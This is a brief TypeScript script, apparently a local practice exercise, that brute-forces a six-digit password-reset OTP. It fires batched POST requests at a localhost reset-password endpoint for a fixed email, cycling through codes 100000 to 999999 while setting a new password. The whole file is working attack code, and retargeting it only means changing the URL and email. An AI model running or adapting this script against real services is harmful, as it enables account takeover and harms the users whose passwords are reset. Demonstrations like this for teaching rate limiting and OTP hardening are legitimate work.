import axios from 'axios';


async function attack(opt: string) {
  try {
    const { data } = await axios.request({
      method: 'POST',
      url: 'http://localhost:3000/reset-password',
      headers: { 'content-type': 'application/json' },
      data: { email: 'Adii@mail.com', otp: opt, newPassword: 'fbjwbbf' }
    });
    console.log(data);
  } catch (error) {
    // console.error(error);
  }
}

// attack('123456');
// attack('123356');
// attack('125456');


// Batching the attack
async function main() {
  for (let i = 100000; i < 999999; i += 100) {
    let p = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      p.push(attack((i + j).toString()));
    }
    await Promise.all(p);
  }
}

main();

